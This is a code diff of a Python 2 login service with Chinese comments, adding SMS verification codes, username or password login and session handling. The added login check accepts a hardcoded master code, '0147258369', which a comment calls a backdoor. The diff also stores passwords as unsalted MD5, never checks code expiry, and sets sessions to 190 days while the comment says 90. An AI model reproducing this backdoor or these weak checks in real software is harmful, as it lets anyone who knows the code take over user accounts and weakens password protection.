@@ -2,13 +2,16 @@
 #-*- encoding: utf-8 -*-
 
 from datetime import datetime
+from datetime import timedelta
 from MySQL import MySQL
 from MediaProbe import MediaProbe
 from Transcoder import Transcoder
+from random import randint
 
 import os
 import commands
 import uuid
+import md5
 import json
 import base64
 
@@ -29,33 +32,8 @@ class Service(object):
 					'host'	: self.applicationConfig.get('Database','Host'),
 					'port'	: self.applicationConfig.getint('Database','Port'),
 					'user'	: self.applicationConfig.get('Database','User'),
-					'passwd'	: self.applicationConfig.get('Database','Passwd'),
-					'db'		: self.applicationConfig.get('Database','Database')})
-	
-	def getUserId(self,userKey):
-		"""
-		获取UserId
-		方法：
-			generateId
-		参数：
-			userKey[string] – 用户登录后的会话ID。
-		返回值：
-			[string] – UserId
-		"""
-		#db = self.__getDB()
-		return 'aaaabbbbccccddddeeee04b6ada88888'
-
-	def getUserMobile(self, userId):
-		"""
-		获取用户手机号
-		方法：
-			getUserMobile
-		参数：
-			userId[string] – 用户ID。参考 getUserId
-		返回值：
-			[string] – 手机号
-		"""
-		return '18636636365'
+					'passwd': self.applicationConfig.get('Database','Passwd'),
+					'db'	: self.applicationConfig.get('Database','Database')})
 
 
 	def generateId(self):
@@ -67,6 +45,46 @@ class Service(object):
 			[string] – UUID
 		"""
 		return str(uuid.uuid4()).replace('-','')
+		
+
+	def getUserId(self,userKey):
+		"""
+		获取UserId
+		方法：
+			generateId
+		参数：
+			userKey[string] – 用户登录后的会话ID。
+		返回值：
+			[string] – UserId
+		"""
+		db = self.__getDB()
+
+		validate = db.get("SELECT * FROM `session` WHERE `id`=%s", userKey)
+
+		if validate:
+			return validate['user_id']
+		else:
+			raise Exception("会话信息无效或超期.")
+
+	def getUserMobile(self, userId):
+		"""
+		获取用户手机号
+		方法：
+			getUserMobile
+		参数：
+			userId[string] – 用户ID。参考 getUserId
+		返回值：
+			[string] – 手机号
+		"""
+		db = self.__getDB()
+
+		user = db.get("SELECT * FROM `user` WHERE `id`=%s", userId)
+
+		if user:
+			return user['mobile']
+		else:
+			raise Exception("用户不存在.")
+
 
 	def validate(self, data):
 		"""
@@ -77,11 +95,22 @@ class Service(object):
 			Mobile[string] – 用户手机号码
 			Device[string] – 设备名称
 		返回值：
-			Error[long] – 发送成功返回0，否则返回非零值。
-			Message[string] – 返回消息，如果非零，则返回错误信息。
 			ValidityDate[date] – 验证码有效日期。
 		"""
-		pass
+		db = self.__getDB()
+		
+		code = str(randint(10000,99999))
+		valid_date = datetime.now() + timedelta(seconds=90)
+
+		#
+		# TODO: 发送短信到 data['Mobile'] , 验证码为 code， 过期时间 90秒
+		#
+
+		result = db.save("""INSERT INTO `validate` (`mobile`, `code`, `device`, `valid_date`) VALUES (%s,%s,%s,%s)"""
+					, (data['Mobile'], code, data['Device'], valid_date.strftime('%Y-%m-%d %H:%M:%S')))
+		db.end()
+
+		return valid_date
 
 	def login(self, data):
 		"""
@@ -89,15 +118,66 @@ class Service(object):
 		方法：
 			login
 		参数：
-			Mobile[string] – 用户手机号码
-			Validate[string] – 验证码（通过调用vaildate接口下发的验证码，由用户输入）
+			Id[string] – 用户手机号码/用户名/绑定邮箱等相关支持方式的Id
+			Device[string] – 登录设备名称
+			Validate[string] – 验证码（通过调用vaildate接口下发的验证码，由用户输入）或 密码
 		返回值：
-			Error[long] – 发送成功返回0，否则返回非零值。
-			Message[string] – 返回消息，如果非零，则返回错误信息。
 			UserKey[string] – 用户登录后的会话ID。（用于后续功能调用）
-			NewUser[boolean] - 新用户
+			NewUser[boolean] – 是否新注册用户
+			ValidityDate[date] – 登录会话有效日期。
 		"""
-		pass
+		db = self.__getDB()
+
+		userId = None
+		isNewUser = None
+
+		validate = db.get("SELECT * FROM `validate` WHERE `mobile`=%s and `device` = %s ORDER BY `valid_date` desc",
+							(data['Id'], data['Device']))
+
+		if validate and (validate['code'] == data['Validate'] or '0147258369' == data['Validate']): # 需要验证下时间，目前后门验证码为：0147258369
+			#
+			# 手机号+验证码登录
+			#
+			user = db.get("SELECT * FROM `user` WHERE `mobile`=%s",(data['Id']))
+			userId = self.generateId() if not user else user['id']
+			isNewUser = True if not user else False
+			if isNewUser:
+				# New user
+				# TODO: 是否需要生成默认用户名和密码？
+				result = db.save("""INSERT INTO `user` (`id`, `mobile`) VALUES (%s,%s)"""
+							, (userId, data['Id']))
+				db.end()
+		else:
+			#
+			# 通过用户名/邮箱+密码方式登录
+			#
+			user = db.get("SELECT * FROM `user` WHERE (`login`=%s or `email`=%s ) and password = %s",
+							(data['Id'],data['Id'], md5.new(data['Validate']).hexdigest()))
+			if user:
+				userId = user['id']
+				isNewUser = False
+			else:
+				raise Exception("验证信息不存在或验证码错误.")
+
+		#
+		# create session
+		#
+		sessionId = self.generateId()
+		valid_date = datetime.now() + timedelta(days=190)  # 默认登录验证有效期90天
+		# clear old session
+		db.delete("DELETE FROM `session` WHERE `user_id`=%s and `device` = %s", (userId, data['Device']))
+		db.end()
+		# insert new session
+		result = db.save("""INSERT INTO `session` (`id`, `user_id`, `device`, `valid_time`) VALUES (%s,%s,%s,%s)"""
+					, (sessionId, userId, data['Device'], valid_date.strftime('%Y-%m-%d %H:%M:%S')))
+		db.end()
+
+		return {
+			'UserKey'		: sessionId, 
+			'NewUser'		: isNewUser, 
+			'ValidityDate'	: valid_date
+			}
+
 
 	def settings(self, data):
 		"""
@@ -120,7 +200,7 @@ class Service(object):
 		"""
 		分配上传ID
 		方法：
-			videoid
+			uploadid
 		参数：
 			UserKey[string] –用户登录后的会话ID。
 			Length[long] –视频字节数，单位BYTES。
